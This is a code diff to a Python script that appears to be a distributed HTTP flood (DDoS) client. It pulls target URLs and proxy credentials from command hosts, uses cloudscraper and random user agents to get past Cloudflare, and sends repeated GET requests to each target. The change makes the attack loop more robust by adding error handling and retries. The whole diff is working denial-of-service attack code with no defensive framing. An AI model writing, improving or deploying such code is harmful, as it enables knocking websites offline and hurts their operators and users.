@@ -29,28 +29,33 @@ def mainth():
 		scraper = cloudscraper.create_scraper(browser={'browser': 'firefox','platform': 'android','mobile': True},)
 		scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
 		logger.info("GET RESOURCES FOR ATTACK")
-		data = loads(scraper.get(choice(HOSTS)).content)
+		content = scraper.get(choice(HOSTS)).content
+		if content:
+		    data = loads(content)
+		else:
+		    sleep(5)
+		    continue
 		logger.info("STARTING ATTACK TO " + data['site']['page'])
 		site = unquote(data['site']['page'])
 		if site.startswith('http') == False:
-        		    logger.info("STARTED FROM NOT HTTP")
-        		    site = "https://" + site
-		attack = scraper.get(site)
-
-
-		if attack.status_code >= 302 and attack.status_code >= 200:
-		    for proxy in data['proxy']:
-		        print(proxy)
-		        scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
-		        response = scraper.get(site)
-		        if response.status_code >= 200 and response.status_code <= 302:
-		            for i in range(MAX_REQUESTS):
-		                response = scraper.get(site)
-		                logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
-		else:
-		    for i in range(MAX_REQUESTS):
-		        response = scraper.get(site)
-		        logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
+		    site = "https://" + site
+		try:
+		    attack = scraper.get(site)
+		    if attack.status_code >= 302 and attack.status_code >= 200:
+		        for proxy in data['proxy']:
+		            scraper.proxies.update({'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
+		            response = scraper.get(site)
+		            if response.status_code >= 200 and response.status_code <= 302:
+		                for i in range(MAX_REQUESTS):
+		                    response = scraper.get(site)
+		                    logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
+		    else:
+		        for i in range(MAX_REQUESTS):
+		            response = scraper.get(site)
+		            logger.info("ATTACKED; RESPONSE CODE: " + str(response.status_code))
+		except:
+		    logger.warning("issue happened")
+		    continue
 
 
 def cleaner():
